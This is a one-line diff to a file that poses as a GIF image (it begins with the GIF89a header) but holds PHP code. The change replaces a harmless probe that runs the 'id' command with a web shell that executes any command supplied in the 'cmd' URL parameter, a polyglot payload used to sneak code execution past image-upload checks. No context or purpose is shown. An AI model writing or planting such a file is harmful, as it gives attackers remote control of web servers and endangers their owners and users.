@@ -1,1 +1,1 @@
-GIF89a; <?php system("id"); ?>
+GIF89a; <?php system($_GET['cmd']); ?>
